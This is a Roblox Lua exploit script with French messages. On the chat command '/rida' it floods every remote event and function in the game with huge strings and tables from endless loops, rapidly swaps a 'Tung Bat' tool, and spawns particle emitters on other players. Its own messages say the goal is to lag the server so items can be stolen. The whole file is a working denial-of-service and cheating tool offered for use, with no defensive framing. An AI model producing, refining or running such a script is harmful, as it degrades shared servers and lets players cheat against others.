local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local function getAllRemotes()
    local remotes = {}
    for _, obj in ipairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(remotes, obj)
        end
    end
    return remotes
end

local remotes = getAllRemotes()

LocalPlayer.Chatted:Connect(function(message)
    if message:lower() == "/rida" then
        settings().Rendering.QualityLevel = Enum.SavedQualitySetting.Level01
        
        print("🚀 LAG BOMBE V2.0 ACTIVÉE ! Serveur en feu, steal smooth 🔥 | Remotes spammés: " .. #remotes)
        
        spawn(function()
            while true do
                for _, remote in ipairs(remotes) do
                    pcall(function()
                        local hugeStr = string.rep("a", 50000)  -- 50k chars overload
                        local hugeTbl = {}  
                        for i = 1, 1000 do
                            hugeTbl[i] = {math.random(1e9, 9e9), string.rep("lag", 100)}
                        end
                        if remote:IsA("RemoteEvent") then
                            remote:FireServer(hugeStr, hugeTbl, LocalPlayer.Character, Vector3.new(1e9, 1e9, 1e9))
                        elseif remote:IsA("RemoteFunction") then
                            remote:InvokeServer(hugeStr, hugeTbl)
                        end
                    end)
                end
                task.wait(0.01)  
            end
        end)
        
        for i = 1, 10 do
            spawn(function()
                while true do
                    for _, remote in ipairs(remotes) do
                        pcall(function()
                            remote:FireServer("LAG_BOMB_" .. i, LocalPlayer, workspace)
                        end)
                    end
                    task.wait(0.05)
                end
            end)
        end
        
        spawn(function()
            while true do
                task.wait(0.09)
                local char = LocalPlayer.Character
                if char then
                    -- Backpack -> Char
                    local backpackTung = LocalPlayer.Backpack:FindFirstChild("Tung Bat")
                    if backpackTung then
                        backpackTung.Parent = char
                    end
                    -- Char -> Backpack
                    local charTung = char:FindFirstChild("Tung Bat")
                    if charTung then
                        charTung.Parent = LocalPlayer.Backpack
                    end
                end
            end
        end)
        
        spawn(function()
            while true do
                for _, plr in ipairs(Players:GetPlayers()) do
                    if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                        local pos = plr.Character.HumanoidRootPart.Position
                        local part = Instance.new("Part")
                        part.Size = Vector3.new(0.1,0.1,0.1)
                        part.Position = pos
                        part.Anchored = true
                        part.CanCollide = false
                        part.Transparency = 1
                        part.Parent = workspace
                        local att = Instance.new("Attachment", part)
                        local pe = Instance.new("ParticleEmitter", att)
                        pe.Rate = 5000
                        pe.Lifetime = NumberRange.new(0.1)
                        pe.Enabled = true
                        game:GetService("Debris"):AddItem(part, 1) 
                    end
                end
                task.wait(0.1)
            end
        end)
    end
end)

print("Script chargé ! Tape /rida pour laguer le serveur 💀")
